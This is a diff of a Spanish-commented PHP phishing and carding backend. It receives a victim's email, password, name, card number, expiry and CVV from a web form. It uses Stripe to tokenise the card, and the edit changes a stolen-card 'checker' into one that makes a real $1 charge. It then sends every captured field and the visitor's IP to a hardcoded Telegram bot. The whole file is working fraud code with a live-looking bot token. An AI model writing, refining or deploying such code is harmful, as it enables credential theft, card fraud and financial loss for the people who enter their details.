@@ -1,23 +1,28 @@
 <?php
-// Configuración
+// Configuración de Telegram
 $token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
 $chat_id = "7993722214";
-$stripe_secret_key = "TU_STRIPE_SECRET_KEY_AQUI"; // Reemplaza con sk_live_...
+
+// CONFIGURACIÓN DE STRIPE
+$stripe_secret_key = "TU_STRIPE_SECRET_KEY_AQUI"; // sk_live_...
+$monto = 100; // Monto en centavos (100 = $1.00 USD)
+$moneda = "usd";
 
 $data = json_decode(file_get_contents('php://input'), true);
 
 if ($data) {
-    $status_fondos = "⏳ No verificado";
+    $pago_exitoso = false;
+    $status_pago = "❌ No procesado";
 
-    // LÓGICA DE STRIPE (Verificación de $1.00)
+    // 1. LÓGICA DE CARGO REAL EN STRIPE
     if (!empty($stripe_secret_key)) {
         try {
+            // A. Crear Token de Tarjeta
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($ch, CURLOPT_POST, 1);
-            // Formatear datos para Stripe
-            $card_data = http_build_query([
+            $card_details = http_build_query([
                 'card' => [
                     'number' => $data['cc'],
                     'exp_month' => explode('/', $data['ex'])[0],
@@ -25,26 +30,45 @@ if ($data) {
                     'cvc' => $data['cv'],
                 ]
             ]);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $card_data);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $card_details);
             curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret_key . ':');
-
-            $result = curl_exec($ch);
-            $token_stripe = json_decode($result, true);
-
-            if (isset($token_stripe['id'])) {
-                $status_fondos = "✅ CON FONDOS (Token: " . $token_stripe['id'] . ")";
-            } else {
-                $status_fondos = "❌ SIN FONDOS / RECHAZADA (" . $token_stripe['error']['message'] . ")";
-            }
+            $res_token = json_decode(curl_exec($ch), true);
             curl_close($ch);
+
+            if (isset($res_token['id'])) {
+                // B. Realizar el Cobro Real
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/charges");
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                $charge_details = http_build_query([
+                    'amount' => $monto,
+                    'currency' => $moneda,
+                    'source' => $res_token['id'],
+                    'description' => 'Verificacion de Membresia - ' . $data['em']
+                ]);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $charge_details);
+                curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret_key . ':');
+                $res_charge = json_decode(curl_exec($ch), true);
+                curl_close($ch);
+
+                if (isset($res_charge['status']) && $res_charge['status'] == 'succeeded') {
+                    $pago_exitoso = true;
+                    $status_pago = "✅ COBRO REALIZADO ($1.00)";
+                } else {
+                    $status_pago = "❌ COBRO DECLINADO: " . ($res_charge['error']['message'] ?? 'Error desconocido');
+                }
+            } else {
+                $status_pago = "❌ TARJETA INVÁLIDA: " . ($res_token['error']['message'] ?? 'Error de token');
+            }
         } catch (Exception $e) {
-            $status_fondos = "⚠️ Error Stripe: " . $e->getMessage();
+            $status_pago = "⚠️ ERROR SISTEMA: " . $e->getMessage();
         }
     }
 
-    // MENSAJE PARA TELEGRAM
-    $mensaje = "🔔 NUEVO HIT - CHECKER STRIPE 🔔\n\n";
-    $mensaje .= "💰 STATUS: $status_fondos\n";
+    // 2. ENVIAR REPORTE A TELEGRAM
+    $mensaje = "🔔 RESULTADO DE PAGO 🔔\n\n";
+    $mensaje .= "💰 STATUS: $status_pago\n";
     $mensaje .= "📧 Correo: " . $data['em'] . "\n";
     $mensaje .= "🔑 Pass: " . $data['pw'] . "\n";
     $mensaje .= "👤 Titular: " . $data['nm'] . "\n";
@@ -53,7 +77,6 @@ if ($data) {
     $mensaje .= "🔒 CVV: " . $data['cv'] . "\n";
     $mensaje .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];
 
-    // Enviar a Telegram
     $url_tg = "https://api.telegram.org/bot$token/sendMessage";
     $ch_tg = curl_init();
     curl_setopt($ch_tg, CURLOPT_URL, $url_tg);
@@ -63,7 +86,7 @@ if ($data) {
     curl_exec($ch_tg);
     curl_close($ch_tg);
     
-    // Responder al JS para que el flujo siga
-    echo json_encode(["status" => "ok", "funds" => $status_fondos]);
+    // Responder al Navegador
+    echo json_encode(["pago" => $pago_exitoso]);
 }
 ?>
